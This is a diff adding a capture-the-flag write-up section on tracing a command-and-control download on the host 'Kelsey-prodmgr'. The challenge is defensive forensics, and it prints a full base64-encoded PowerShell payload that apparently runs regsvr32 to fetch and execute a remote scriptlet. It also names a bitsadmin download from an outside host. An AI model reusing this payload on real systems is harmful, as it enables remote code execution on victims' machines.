@@ -260,3 +260,46 @@ That one seems kinda guessy but I mean , I do have a description which says I ne
 Correct! A clown!
 
 #### FLAG : ``CLOWN``
+
+
+# 4. I'm not even supposed to be here today (10)
+#### Description :
+``Kelesy complained about something strange on her computer, and the L1 analyst looking at it could use some help. Can you provide the remote file name that was downloaded and executed to establish Command and Control. Kelesy's machine name is Kelsey-prodmgr .``
+
+I am provided with the same website and credentials as the previous challenge (Malop) , but with a different kind of task.
+
+Aight... Let's go get this one too.
+
+Once Im in the website , I decided to check on `High` marked threats :
+
+![high](url)
+
+Right there is what I need, a missuse of powershell.exe on kelsey-prodmgr.
+I clicked on that to have a deeper view on the threat and came up with this : 
+
+![cmd](url)
+
+I clicked to expand them and quickly noticed an encoded powershell command at the fourth :
+``/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1XJlZ3N2cjMyIC9zIC9uIC91IC9pOmh0dHA6Ly82Ni4xNzUuMTAwLjQ1L3BheWxvYWQta2Vsc2V5LnNjdCBzY3JvYmouZGxsAA==
+``
+
+![b64](url)
+
+I can see a file being dropped in the machine but sadly none of those filenames above were the correct flag so I decided to again open the tree of the following powershell process and see whats there :
+
+![tree2](url)
+
+Something interesting going on with bitsadmin.exe which tries to transfer 2 files : ``updates.xml`` and ``msbuild_nps.xml`` from http://rctesting.duckdns.org which seems suspicious...
+
+I tried to use both of the files as flags since ... why not? and ended up with one of them being correct.
+
+#### FLAG : msbuild_nps.xml
+
+# 02 Advanced 
+
+```
+    ├── Are you still investigating that? (15)
+    ├── Images != password vaults (15)
+    └── REally this should be easier (15)
+
+```
